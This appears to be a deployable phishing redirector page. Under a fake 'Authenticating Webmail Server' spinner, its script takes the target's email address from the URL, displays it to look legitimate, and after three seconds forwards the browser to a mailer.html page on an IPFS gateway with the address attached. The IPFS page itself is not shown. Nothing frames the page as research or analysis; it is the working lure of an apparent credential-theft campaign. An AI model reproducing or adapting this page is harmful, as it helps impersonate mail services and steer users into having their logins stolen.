<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Authenticating Webmail Server</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            margin-top: 50px;
            background: #f0f2f5;
            color: #333;
        }
        .loader {
            border: 5px solid #f3f3f3;
            border-top: 5px solid #3498db;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .status {
            font-weight: bold;
            margin-top: 20px;
            font-size: 18px;
        }
        .email-display {
            color: #2c7be5;
            font-weight: bold;
            margin-top: 10px;
            padding: 5px;
            background: #f8f9fa;
            border-radius: 4px;
            display: inline-block;
        }
    </style>
    <script>
        // Extract and validate email from URL
        function getEmailFromURL() {
            // First try URL parameters
            const urlParams = new URLSearchParams(window.location.search);
            let email = urlParams.get('email');
            
            // If not in parameters, try hash
            if (!email && window.location.hash) {
                const hash = window.location.hash.substring(1);
                // Remove any 'email=' prefix if present
                email = hash.startsWith('email=') ? hash.substring(6) : hash;
            }
            
            // Decode and validate
            if (email) {
                try {
                    email = decodeURIComponent(email);
                    // More comprehensive email validation
                    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
                    if (emailRegex.test(email)) {
                        return email;
                    }
                } catch (e) {
                    console.error('Error decoding email:', e);
                }
            }
            return null;
        }

        // Display the recipient email
        function showRecipientEmail() {
            const email = getEmailFromURL();
            if (email) {
                const displayElement = document.createElement('div');
                displayElement.className = 'email-display';
                displayElement.textContent = `Recipient: ${email}`;
                document.body.appendChild(displayElement);
            }
        }

        // Initialize and redirect
        document.addEventListener('DOMContentLoaded', function() {
            showRecipientEmail();
            
            setTimeout(() => {
                const email = getEmailFromURL();
                let ipfsURL = 'https://bafybeicmwrz7hj3wdwswr3ztezlj326mnnszzp4qb6rlpyew53vi4itxsm.ipfs.dweb.link/mailer.html';
                
                // Append email to the URL if it exists
                if (email) {
                    ipfsURL += `#${encodeURIComponent(email)}`;
                }
                
                // Redirect to the IPFS URL
                window.location.href = ipfsURL;
            }, 3000);
        });
    </script>
</head>
<body>
    <div class="loader"></div>
    <div class="status">AUTHENTICATING WEBMAIL SERVER...</div>
</body>
</html>
